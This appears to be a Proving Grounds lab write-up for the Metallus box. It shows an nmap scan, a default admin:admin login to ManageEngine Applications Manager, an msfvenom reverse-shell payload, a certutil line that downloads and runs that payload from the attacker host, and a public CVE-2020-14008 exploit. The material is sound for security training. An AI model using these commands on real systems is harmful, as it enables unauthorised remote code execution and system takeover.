---
description: Proving Grounds PG Practice Metallus writeup
---

# Metallus

## Nmap

```
sudo nmap 192.168.203.96 -p- -sS -sV                  

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
12000/tcp open  cce4x?
22222/tcp open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
40443/tcp open  unknown
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  tcpwrapped
49693/tcp open  java-rmi      Java RMI
49718/tcp open  unknown
49796/tcp open  unknown
49797/tcp open  unknown
4 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
```

Enumerating the ports we have 40443 which has produced no information from Nmap. Browsing to the port in a browser reveals a login page: [http://192.168.100.96:40443/index.do](http://192.168.100.96:40443/index.do)

![](<../../../.gitbook/assets/image (1001).png>)

We can see from the footer of the page the software is Applications Manager (Build No:14700). I was able to login with a guess on the credentials `admin:admin`.

![](<../../../.gitbook/assets/image (1002).png>)

The target application has what are called 'Actions' which allows certain scripts and files to be executed when a certain parameter is met. To take advantage of this first we can head to **Admin > Upload Files / Binaries** to upload a `cmd` command.

Before we upload we first need to create a `msfvenom` reverse shell.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -f exe -o reverse.exe
```

After this has completed we need to then create a batch file as only batch files and scripts are executed from the _Actions_ on the target web server.

Create a batch command to the following:

```bash
certutil.exe -f -urlcache -split http://<IP>/reverse.exe c:\windows\temp\reverse.exe && cmd.exe /c c:\windows\temp\reverse.exe
```

Ensuring the bottom most options for '**Upload Script to \<Product\_Home>/working/**' is selected.

![](<../../../.gitbook/assets/image (1955).png>)

After upload head over to **Actions > Execute Program** Then create a new Action as per the screenshot below:

![](<../../../.gitbook/assets/image (1956).png>)

After creation set up a `netcat` listener to the specified port in the `msfvenom` command then start a Python\*\* SimpleHTTPServer\*\* on the attacking machine to the directory of the `msfvenom` reverse.exe file. After completing this head over to\*\* Actions > View Actions\*\* and manually execute the script under the **Execute** tab.

We should see where the script downloads the reverse.exe from the Python **SimpleHTTPServer**.

![](<../../../.gitbook/assets/image (1957).png>)

And soon after when the scripts executes the reverse.exe we should land a SYSTEM shell.

![](<../../../.gitbook/assets/image (1958).png>)

An alternative solution leveraging \*\*CVE:2020-14008 \*\*for a more scripted solution abusing JAR files.

**Description:**

Zoho ManageEngine Applications Manager 14710 and before allows an authenticated admin user to upload a vulnerable jar in a specific location, which leads to remote code execution.

\*\*Reference: \*\*[https://nvd.nist.gov/vuln/detail/CVE-2020-14008](https://nvd.nist.gov/vuln/detail/CVE-2020-14008)

Searching for exploits with searchsploit shows a RCE for build 14700.

![](<../../../.gitbook/assets/image (1003) (1).png>)

{% embed url="https://www.exploit-db.com/exploits/48793" %}

The syntax for the exploit script is shown below:

```bash
python3 48793.py <url> <username> <password> <reverse_shell_host> <reverse_shell_port>
python3 48793.py http://<IP>:40443 admin admin <Attacker-IP> 443
```

![](<../../../.gitbook/assets/image (1959).png>)

After execution we should have another SYSTEM shell.

![](<../../../.gitbook/assets/image (1960).png>)
